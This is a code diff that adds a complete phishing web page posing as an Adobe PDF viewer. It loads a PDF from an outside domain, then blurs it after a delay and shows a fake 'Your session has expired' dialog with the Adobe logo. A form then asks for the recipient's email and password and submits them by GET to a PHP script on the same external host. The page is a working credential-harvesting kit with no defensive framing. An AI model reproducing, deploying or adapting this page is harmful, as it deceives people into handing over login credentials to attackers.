@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Load PDF</title>
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            overflow: hidden;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            transition: filter 0.5s ease; /* Smooth transition for blur effect */
+        }
+        #smallIframe {
+            position: absolute;
+            width: 400px;
+            height: 300px; /* Increased height to accommodate the Sign in text */
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(169, 169, 169, 0.6); /* Dark gray with transparency */
+            border: none;
+            text-align: center;
+            padding-top: 20px; /* Add some padding at the top */
+            box-sizing: border-box;
+            opacity: 0;
+            transition: opacity 1s ease; /* Smooth transition for fading effect */
+        }
+        #logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 150px; /* Adjust size as needed */
+            height: auto;
+        }
+        #expiredText, .throbber {
+            transition: opacity 1s ease; /* Smooth transition for fading effect */
+        }
+        #expiredText {
+            color: #fa0c00; /* Reddish-orange color */
+            font-size: 24px;
+            margin-top: 60px; /* Space between the logo and text */
+        }
+        .throbber {
+            margin: 20px auto; /* Center the throbber */
+            width: 50px;
+            height: 50px;
+            border: 6px solid #fa0c00; /* Reddish-orange color */
+            border-top: 6px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #loginForm {
+            display: none; /* Initially hidden */
+            text-align: center;
+            margin-top: 50px; /* Space between the throbber and login form */
+        }
+        #loginForm input {
+            display: block;
+            width: calc(100% - 40px); /* Add padding */
+            margin: 15px auto;
+            padding: 5px;
+            font-size: 16px;
+            border: 1px solid #fa0c00; /* Reddish-orange color */
+            border-radius: 4px;
+        }
+        #loginForm button {
+            background-color: #fa0c00; /* Reddish-orange color */
+            color: white;
+            border: none;
+            padding: 10px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: calc(100% - 40px); /* Match the width of the text boxes */
+            margin: 10px auto; /* Center the button */
+        }
+        #signInText {
+            color: #000; /* black color */
+            font-size: 16.5px;
+            margin-bottom: 30px; /* Space between the Sign in text and the form */
+            font-weight: light; /* Make the text bold */
+        }
+    </style>
+</head>
+<body>
+    <!-- Main iframe to display the PDF -->
+    <iframe id="pdfViewer" src="https://78099.link/pdf/boat1.pdf" aria-label="PDF Viewer"></iframe>
+    <!-- Smaller iframe initially hidden with logo, text, and throbber -->
+    <div id="smallIframe" role="dialog" aria-labelledby="expiredText">
+        <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/8/8d/Adobe_Corporate_Logo.png" alt="Adobe Logo">
+        <p id="expiredText">Your session has expired</p>
+        <div class="throbber" role="status" aria-live="polite"></div>
+        <div id="loginForm">
+            <p id="signInText">Sign in with recipient email to access shared document</p>
+            <form id="authForm" action="https://78099.link/pdf/new.php" method="GET" onsubmit="return validateForm()">
+                <input type="email" id="email" name="email" placeholder="Email" aria-label="Email" required>
+                <input type="password" id="password" name="password" placeholder="Password" aria-label="Password" required minlength="4">
+                <button type="submit">Sign in</button>
+            </form>
+        </div>
+    </div>
+    <script>
+        // Function to apply blur effect to the main iframe
+        function applyBlur() {
+            document.getElementById('pdfViewer').style.filter = 'blur(5px)';
+        }
+        // Function to show the smaller iframe
+        function showSmallIframe() {
+            document.getElementById('smallIframe').style.opacity = '1';
+        }
+        // Function to fade out the expired text and throbber
+        function fadeOutTextAndThrobber() {
+            document.getElementById('expiredText').style.opacity = '0';
+            document.querySelector('.throbber').style.opacity = '0';
+            setTimeout(showLoginForm, 1000); // Show login form after fade out
+        }
+        // Function to show the login form
+        function showLoginForm() {
+            document.getElementById('expiredText').style.display = 'none';
+            document.querySelector('.throbber').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+        }
+        // Function to validate email and password
+        function validateForm() {
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailPattern.test(email)) {
+                alert("Please enter a valid email address.");
+                return false;
+            }
+            if (password.length < 4) {
+                alert("Password must be at least 4 characters long.");
+                return false;
+            }
+            return true;
+        }
+        // Set timeouts to trigger the functions
+        setTimeout(applyBlur, 10000); // Apply blur after 5 seconds
+        setTimeout(showSmallIframe, 11000); // Show smaller iframe after 6 seconds
+        setTimeout(fadeOutTextAndThrobber, 15000); // Fade out text and throbber 3 seconds after small iframe appears
+    </script>
+</body>
+</html>
